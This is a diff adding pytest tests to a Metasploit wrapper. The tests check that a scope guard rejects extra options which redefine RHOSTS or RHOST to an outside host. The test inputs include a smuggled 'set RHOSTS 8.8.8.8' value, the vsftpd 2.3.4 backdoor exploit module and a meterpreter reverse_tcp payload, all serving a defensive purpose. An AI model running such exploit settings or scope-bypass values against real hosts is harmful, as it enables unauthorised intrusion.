@@ -87,3 +87,38 @@ def test_metasploit_builds_clean_resource_script_for_valid_input():
     script = cmd[-1]
     assert "use exploit/unix/ftp/vsftpd_234_backdoor" in script
     assert "set RHOSTS 10.10.10.5" in script
+
+
+def test_metasploit_rejects_extra_options_that_redefine_rhosts():
+    # Reported by an external reviewer: the scope guard only ever checked `target`, so
+    # extra_options could set a different RHOSTS and msfconsole would use the last `set`
+    # it saw, running against a host the scope guard never looked at.
+    tool = MetasploitModuleRun()
+    with pytest.raises(ValueError):
+        tool.build_command(
+            target="10.10.10.5",
+            module="exploit/x",
+            extra_options="set RHOSTS 8.8.8.8",
+        )
+
+
+def test_metasploit_rejects_extra_options_that_redefine_rhost_singular_case_insensitive():
+    tool = MetasploitModuleRun()
+    with pytest.raises(ValueError):
+        tool.build_command(
+            target="10.10.10.5",
+            module="exploit/x",
+            extra_options="  SET rhost 8.8.8.8",
+        )
+
+
+def test_metasploit_allows_other_extra_options():
+    tool = MetasploitModuleRun()
+    cmd = tool.build_command(
+        target="10.10.10.5",
+        module="exploit/x",
+        extra_options="set PAYLOAD linux/x86/meterpreter/reverse_tcp\nset LHOST 10.10.10.2",
+    )
+    script = cmd[-1]
+    assert "set PAYLOAD linux/x86/meterpreter/reverse_tcp" in script
+    assert "set LHOST 10.10.10.2" in script
